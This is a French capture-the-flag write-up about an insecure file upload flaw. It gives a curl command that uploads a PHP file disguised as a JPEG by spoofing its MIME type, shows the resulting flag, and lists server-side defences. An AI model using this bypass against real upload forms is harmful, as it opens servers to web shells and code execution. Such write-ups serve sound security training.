
---

# Exploitation de Faille d'Upload de Fichier et Obtenu de Flag

## Description de la Faille

Une faille d'upload de fichier a été découverte sur une page web permettant de télécharger des images. Bien que la page ne semble accepter que des fichiers `.jpeg`, il est possible de contourner cette restriction et de télécharger un fichier PHP malveillant en le faisant passer pour une image.

## Étapes pour découvrir la faille

### 1. Accéder à la page d'upload

URL : `http://ip-addr/?page=upload#`

La page permet d'uploader des images et n'accepte que les fichiers `.jpeg` :

```html
<td>
<form enctype="multipart/form-data" action="#" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000">
    Choose an image to upload:
    <br>
    <input name="uploaded" type="file"><br>
    <br>
    <input type="submit" name="Upload" value="Upload">
</form>
</td>
```

### 2. Simuler une requête POST pour contourner la restriction

Nous allons simuler une requête POST en utilisant `curl` pour uploader un fichier PHP tout en le faisant passer pour une image `.jpeg`. La commande `curl` utilisée est :

```sh
curl -s -X POST -F "Upload=Upload" -F "uploaded=@./test.php;type=image/jpeg" "http://ip-addr/?page=upload"
```

#### Explication de la commande `curl`

- **`curl`** : Outil en ligne de commande pour transférer des données avec des URL.
- **`-s`** : Mode silencieux. Empêche `curl` d'afficher la barre de progression et les messages d'erreur.
- **`-X POST`** : Spécifie que la requête doit être une requête POST.
- **`-F "Upload=Upload"`** : Envoie le champ de formulaire `Upload` avec la valeur `Upload`.
- **`-F "uploaded=@./test.php;type=image/jpeg"`** : Envoie le fichier `test.php` en le faisant passer pour un type `image/jpeg`.
- **`"http://ip-addr/?page=upload"`** : URL de la page d'upload.

L'usage de `test.php` est stratégique car les serveurs web utilisent souvent PHP pour exécuter des scripts. D'autres raisons incluent :
- Les fichiers PHP peuvent contenir des scripts malveillants qui s'exécutent sur le serveur.
- Les fichiers PHP peuvent permettre d'obtenir un shell web pour exécuter des commandes sur le serveur.

### 3. Affiner la recherche avec `grep`

Pour éviter de parcourir toute la page de réponse, nous utilisons `grep` pour filtrer les lignes contenant le flag :

```sh
curl -s -X POST -F "Upload=Upload" -F "uploaded=@./test.php;type=image/jpeg" "http://ip-addr/?page=upload" | grep flag
```

#### Résultat

```
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
```

### Flag

```
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## Nom de la Faille

**Faille d'Upload de Fichier Insecure (Insecure File Upload Vulnerability)**

## Recommandations pour éviter cette faille

1. **Valider le type de fichier côté serveur** :
   - Ne vous fiez pas uniquement aux extensions de fichiers ou aux types MIME fournis par le client. Analysez le contenu réel des fichiers pour vérifier leur type.

2. **Restreindre les types de fichiers acceptés** :
   - Limitez les types de fichiers acceptés aux types nécessaires pour l'application (par exemple, uniquement `.jpeg`).

3. **Renommer les fichiers uploadés** :
   - Renommez les fichiers uploadés de manière sécurisée avant de les enregistrer sur le serveur pour éviter l'exécution de scripts malveillants.

4. **Utiliser des répertoires sécurisés pour le stockage** :
   - Stockez les fichiers uploadés dans des répertoires non accessibles publiquement pour éviter qu'ils ne soient exécutés directement par le serveur web.

5. **Mettre en place des contrôles d'accès** :
   - Assurez-vous que seuls les utilisateurs autorisés peuvent uploader des fichiers, et utilisez des contrôles d'accès pour limiter les actions possibles.

6. **Scanner les fichiers pour les malwares** :
   - Utilisez des solutions antivirus pour scanner les fichiers uploadés à la recherche de malwares.

7. **Limiter les permissions d'exécution** :
   - Configurez le serveur pour ne pas exécuter les fichiers uploadés en tant que scripts. Par exemple, désactivez l'exécution de fichiers PHP dans les répertoires de téléchargement.

8. **Audits de sécurité réguliers** :
   - Effectuez régulièrement des audits de sécurité pour identifier et corriger les failles potentielles dans le processus d'upload de fichiers.

En suivant ces recommandations, vous pouvez réduire le risque d'exploitations via des uploads de fichiers et améliorer la sécurité de votre application web.

---

